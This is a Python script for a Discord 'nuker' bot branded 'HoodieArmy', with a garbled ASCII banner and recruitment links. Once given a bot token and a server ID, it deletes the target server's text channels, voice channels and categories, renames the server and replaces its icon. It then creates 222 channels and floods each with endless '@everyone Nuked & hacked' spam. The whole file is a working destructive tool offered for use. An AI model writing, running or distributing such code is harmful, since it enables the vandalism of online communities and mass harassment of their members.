import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time

print(Fore.LIGHTBLUE_EX + "https://dsc.gg/hoddiearmy ")
print(Fore.LIGHTRED_EX + '''

                 
                  
                   
                    
                                                        
â–€â–â–â–â–€â–€â–€â–â–â–                â–â–                            
  â–â–    â–€â–                â–â–                            
  â–â–   â–   â–„â–â–â–€â–â– â–„â–â–â–€â–â–â–â–â–â–â–â– â–„â–â–€â–â–â–„  â–„â–â–â–€â–â–â–€â–â–â–€   â–€â–â–â–€
  â–â–â–â–â–â–  â–â–â–€  â–â– â–â–   â–€â–€ â–â–  â–â–   â–â– â–â–â–€  â–â–  â–â–   â–„â–  
  â–â–   â–  â–„â–      â–€â–â–â–â–â–â–„ â–â–   â–„â–â–â–â–â– â–â–        â–â– â–„â–   
  â–â–     â–„â–â–â–„    â–„â–â–„   â–â– â–â–  â–â–   â–â– â–â–â–„    â–„   â–â–â–    
â–„â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–€ â–â–â–â–â–â–â–€ â–€â–â–â–â–â–â–â–â–â–€â–â–â–„â–â–â–â–â–â–€    â–„â–     
                                               â–„â–       
                                             â–â–â–€        

                                                                     
â–€â–â–â–â–„   â–€â–â–â–â–€â–â–â–â–€   â–€â–â–â–â–€â–â–â–â–â–€ â–€â–â–â–â–€â–€â–â–â–â–€â–€â–€â–â–â–â–€â–â–â–â–€â–€â–€â–â–â–„  
  â–â–â–â–„    â–  â–â–       â–   â–â–   â–„â–â–€    â–â–    â–€â–  â–â–   â–€â–â–â–„ 
  â– â–â–â–   â–  â–â–       â–   â–â– â–„â–â–€      â–â–   â–    â–â–   â–„â–â–  
  â–  â–€â–â–â–„ â–  â–â–       â–   â–â–â–â–â–â–„      â–â–â–â–â–â–    â–â–â–â–â–â–â–   
  â–   â–€â–â–â–„â–  â–â–       â–   â–â–  â–â–â–     â–â–   â–  â–„ â–â–  â–â–â–„   
  â–     â–â–â–  â–â–â–„     â–„â–   â–â–   â–€â–â–â–„   â–â–     â–„â– â–â–   â–€â–â–â–„ 
â–„â–â–â–â–„    â–â–   â–€â–â–â–â–â–â–â–€â–€ â–„â–â–â–â–â–„   â–â–â–â–„â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–„ â–„â–â–â–â–„
                                                          
                                                          
                                                                                                                                
                                                                                                                                           
   
                                                                          
                        
                         
                          
                                                      
                               ''')

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.MAGENTA + "discord bot token: ")
guild_id = input("server id: ")
spam_message = input("spam message: ")
new_channels_name = input("new channels name: ")
new_guild_name = input("new server name: ") # Přidáno pro změnu názvu serveru
new_guild_pfp = input("new server pfp URL: ") # Přidáno pro změnu profilovky serveru
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone Nuked & hacked by *** + GRABBED TY FOR INFO BĂ­tch by HoodieArmy https://discord.gg/MQmbWVgJy7 (join)" + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"Syntheeee  {bot.user}")

    
    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "Crips"

        
        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

    for channel in text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for channel in voice_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for category in categories:
        try:
            await category.delete()
            await asyncio.sleep(0)
            print("deleted", category.name)
        except:
            pass
    try:
        
        await guild.edit(name=new_guild_name)
        await print("")
    except:
        print("name edit error")
    try:
         
        await guild.edit(icon=new_guild_pfp)
        await print("")
    except:
        print("pfp edit error")

    channels = []
    for i in range(222):
        channel_name = new_channels_name
        channel = await guild.create_text_channel(channel_name)
        channels.append(channel)
        await asyncio.sleep(0)
        print("created:", channel.name)
        
        bot.loop.create_task(send_message_periodically(channel))

bot.run(token)
